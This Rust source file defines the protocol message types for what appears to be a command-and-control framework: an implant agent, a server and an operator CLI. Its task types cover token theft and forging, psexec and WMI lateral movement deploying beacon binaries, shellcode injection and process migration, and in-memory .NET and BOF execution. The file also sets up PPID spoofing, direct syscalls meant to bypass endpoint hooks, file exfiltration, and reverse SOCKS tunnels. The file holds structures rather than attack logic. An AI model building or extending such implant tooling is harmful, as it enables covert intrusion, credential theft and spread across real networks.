//! Protocol message types shared across server, agent, and CLI.

use serde::{Deserialize, Serialize};

/// Agent registration request (agent → server).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterReq {
    pub agent_id: String,
    pub platform: String,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os_version: Option<String>,
    pub ip_addrs: Option<String>,
    pub alias: Option<String>,
    pub note: Option<String>,
}

/// Agent registration response (server → agent).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterResp {
    pub status: String,
    #[serde(default)]
    pub message: String,
}

/// Task type discriminator for commands.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Default)]
#[serde(rename_all = "snake_case")]
pub enum TaskType {
    #[default]
    Shell,
    Upload,
    Download,
    StealToken,
    MakeToken,
    Rev2Self,
    JumpPsexec,
    JumpWmi,
    RemoteExec,
    Bof,
    Inject,
    Shinject,
    SpawnInject,
    Migrate,
    Spawn,
    SetSpawnTo,
    ExecuteAssembly,
}

/// Command dispatched to agent (server → agent).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub cmd_id: String,
    /// Shell command text (Shell), or JSON-encoded task payload (Upload/Download).
    pub command: String,
    #[serde(default)]
    pub task_type: TaskType,
}

/// Upload task payload — JSON-encoded in Command.command for Upload tasks.
/// Server has assembled the file; agent fetches it and writes to `path`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UploadTask {
    pub transfer_id: String,
    pub path: String,
}

/// Download task payload — JSON-encoded in Command.command for Download tasks.
/// Agent reads `path` and sends chunks back to server.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DownloadTask {
    pub transfer_id: String,
    pub path: String,
}

/// A single chunk of a file transfer (used in both directions).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChunk {
    pub transfer_id: String,
    /// 0-based chunk index.
    pub seq: u32,
    /// Total number of chunks.
    pub total: u32,
    /// Base64-encoded chunk bytes.
    pub data: String,
}

/// jump psexec payload — beacon binary deployed via SMB + SCM service.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JumpPsexecTask {
    pub target: String,
    /// Base64-encoded beacon binary.
    pub payload_b64: String,
}

/// jump wmi payload — beacon binary deployed via SMB + WMI process create.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JumpWmiTask {
    pub target: String,
    /// Base64-encoded beacon binary.
    pub payload_b64: String,
}

/// remote-exec payload — run a command on a remote host (no beacon deploy).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RemoteExecTask {
    /// Execution method: "psexec" or "wmi".
    pub method: String,
    pub target: String,
    pub command: String,
}

/// BOF execution payload — JSON-encoded in Command.command for Bof tasks.
/// The `bof_b64` field contains the base64-encoded .o file.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BofTask {
    /// Base64-encoded COFF .o file bytes.
    pub bof_b64: String,
    /// Base64-encoded BOF arguments (Cobalt Strike binary format).
    #[serde(default)]
    pub args_b64: String,
}

/// inject payload — inject shellcode into a running process by PID.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InjectTask {
    pub pid: u32,
    /// Base64-encoded shellcode bytes.
    pub shellcode_b64: String,
}

/// shinject payload — read shellcode from a file path on the agent and inject.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShinjectTask {
    pub pid: u32,
    /// File path on the agent filesystem containing raw shellcode.
    pub shellcode_path: String,
}

/// spawn+inject payload — spawn a suspended process and inject shellcode.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpawnInjectTask {
    /// Base64-encoded shellcode bytes.
    pub shellcode_b64: String,
    /// Override spawn process (default: use agent config spawn_process).
    #[serde(default)]
    pub spawn_exe: Option<String>,
}

/// migrate payload — inject beacon shellcode into target PID, then exit current process.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MigrateTask {
    pub pid: u32,
    /// Base64-encoded beacon shellcode.
    pub shellcode_b64: String,
}

/// spawn payload — spawn sacrificial process and inject beacon shellcode.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpawnTask {
    /// Base64-encoded beacon shellcode.
    pub shellcode_b64: String,
    /// Override spawn process (default: use agent config spawn_process).
    #[serde(default)]
    pub spawn_exe: Option<String>,
}

/// set_spawn_to payload — change the default spawnto process on the agent.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SetSpawnToTask {
    pub path: String,
}

/// execute-assembly payload — in-memory .NET assembly execution.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecuteAssemblyTask {
    /// Base64-encoded .NET assembly (EXE) bytes.
    pub assembly_b64: String,
    /// Command-line arguments passed to Main(string[] args).
    #[serde(default)]
    pub args: Vec<String>,
    /// Run in current process (true) or spawn sacrificial process (false, default).
    #[serde(default)]
    pub inline: bool,
}

/// steal_token payload — JSON-encoded in Command.command.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StealTokenTask {
    pub pid: u32,
}

/// make_token payload — JSON-encoded in Command.command.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MakeTokenTask {
    pub domain_user: String,
    pub password: String,
}

/// Result upload request (agent → server).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResultReq {
    pub cmd_id: String,
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub signature: String,
}

/// Agent runtime config (embedded or file).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub c2_url: String,
    pub profile_name: String,
    pub shared_token: String,
    pub alias: Option<String>,
    pub note: Option<String>,
    /// Default process to spawn for spawn+inject (e.g. "C:\\Windows\\System32\\svchost.exe").
    #[serde(default)]
    pub spawn_process: Option<String>,
    /// Use direct Nt* syscalls instead of Win32 API for injection (bypasses user-mode hooks).
    #[serde(default)]
    pub use_syscalls: bool,
    /// PPID spoof parent process name (e.g. "explorer.exe"). None = no spoofing.
    #[serde(default)]
    pub ppid_spoof: Option<String>,
}

// ─── Shared API response DTOs (server → CLI) ───

/// Agent info returned by GET /admin/agents.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentView {
    pub agent_id: String,
    pub alias: Option<String>,
    pub platform: String,
    pub last_seen_at: Option<String>,
    pub note: Option<String>,
    pub profile_name: Option<String>,
    pub beacon_min_ms: Option<i64>,
    pub beacon_max_ms: Option<i64>,
    pub backoff_max_ms: Option<i64>,
    pub kill_after_hours: Option<i64>,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os_version: Option<String>,
    pub ip_addrs: Option<String>,
    #[serde(default)]
    pub tags: Vec<String>,
}

/// Command result returned by GET /admin/results.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResultView {
    pub agent_id: String,
    pub cmd_id: String,
    pub exit_code: i64,
    pub stdout: String,
    pub stderr: String,
    pub ts_ms: i64,
}

/// Audit log entry returned by GET /admin/audit.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditView {
    pub id: i64,
    pub ts: String,
    pub actor: String,
    pub action: String,
    pub target_type: String,
    pub target_id: String,
    pub context: serde_json::Value,
}

/// Tags response from GET /admin/agents/{id}/tags.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TagsResponse {
    #[serde(default)]
    pub tags: Vec<String>,
}

// ─── Tunnel / Reverse SOCKS5 ───

/// Direction of a tunnel frame.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum TunnelAction {
    /// Server → agent: open TCP connection to `data` ("host:port").
    Open,
    /// Bidirectional: relay payload (base64-encoded bytes in `data`).
    Data,
    /// Either direction: close the tunnel session.
    Close,
}

/// A single tunnel frame piggybacked on the poll channel or sent via tunnel endpoints.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelData {
    pub tunnel_id: u32,
    pub action: TunnelAction,
    /// Open: "host:port". Data: base64-encoded bytes. Close: "".
    pub data: String,
}

/// Unified poll response — wraps an optional command and piggybacked tunnel frames.
/// The agent must parse poll responses as this type (instead of bare Command).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct PollResponse {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub command: Option<Command>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub tunnel_frames: Vec<TunnelData>,
}

/// Active SOCKS5 listener info returned by GET /admin/socks/list.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SocksListenerView {
    pub agent_id: String,
    pub port: u16,
}

/// Active port-forward entry returned by GET /admin/portfwd/list.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PortFwdView {
    pub agent_id: String,
    pub local_port: u16,
    pub remote_target: String,
}

